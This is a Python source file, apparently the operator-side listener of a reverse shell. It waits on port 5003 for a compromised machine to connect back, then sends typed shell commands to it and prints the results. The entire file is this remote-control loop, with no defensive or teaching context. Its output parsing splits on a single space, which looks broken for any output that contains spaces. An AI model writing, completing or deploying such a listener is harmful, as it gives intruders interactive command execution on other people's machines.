import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = " "

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}: {SERVER_PORT}...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}: {client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode().strip()
print("[+] Current working directory:", cwd)
while True:
    command = input(f"{cwd}$> ")
    if not command.strip():
        continue
    if command.lower() == "exit":
        break
    client_socket.send(command.encode())
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)
client_socket.close()
s.close()
